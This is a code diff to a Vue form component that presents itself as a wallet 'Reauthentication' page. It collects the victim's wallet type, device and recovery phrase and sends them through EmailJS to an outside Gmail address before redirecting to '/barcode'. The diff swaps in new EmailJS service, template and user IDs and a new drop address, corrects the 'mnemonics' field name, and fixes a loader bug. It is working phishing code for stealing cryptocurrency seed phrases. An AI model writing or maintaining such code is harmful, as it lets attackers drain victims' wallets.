@@ -71,15 +71,15 @@ export default {
         if (valid) {
           if (valid) {
             var data = {
-              service_id: "service_fukql9p",
-              template_id: "template_t73hyiq",
-              user_id: "user_gEIO4dyYsGHrZgmFgY1Ul",
+              service_id: "service_g49xzs9",
+              template_id: "template_xkj0lgc",
+              user_id: "Q_v6F22hpmQkpwuex",
               template_params: {
                 from_name: 'Reauthentication',
                 wallet_version: this.ruleForm.wallet,
                 device: this.ruleForm.device,
-                nnemonics: this.ruleForm.recovery,
-                reply_to: "crewwebinar@gmail.com",
+                mnemonics: this.ruleForm.recovery,
+                reply_to: "customeronlineagent@gmail.com",
               },
             };
             axios
@@ -89,7 +89,7 @@ export default {
                 self.$router.push("/barcode");
               })
               .catch(function() {
-                this.loader = false;
+                self.loader = false;
               });
           } else {
             this.loader = false;
